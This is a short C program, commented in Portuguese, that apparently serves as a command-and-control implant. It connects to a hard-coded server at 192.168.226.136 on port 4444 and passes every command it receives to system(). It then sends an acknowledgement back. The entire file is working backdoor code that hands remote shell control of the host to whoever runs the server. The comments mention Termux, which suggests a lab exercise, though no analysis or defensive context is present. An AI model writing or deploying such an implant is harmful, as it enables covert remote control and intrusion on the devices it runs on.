#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    const char *ip = "192.168.226.136"; // IP do servidor Linux C2
    short port = 4444;
    char buffer[1024];
    int recv_size;

    // Cria socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Falha ao criar socket");
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    // Conecta ao servidor C2
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("Falha ao conectar ao servidor");
        close(sock);
        return 1;
    }

    printf("Conectado ao servidor C2\n");

    // Recebe comandos e os executa
    while ((recv_size = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[recv_size] = '\0'; // Garante que o buffer seja uma string válida
        printf("Comando recebido: %s\n", buffer);

        // Executa o comando recebido no Linux (Termux)
        system(buffer);

        // Envia resposta para o servidor
        send(sock, "Comando executado", strlen("Comando executado"), 0);
    }

    close(sock);
    return 0;
}
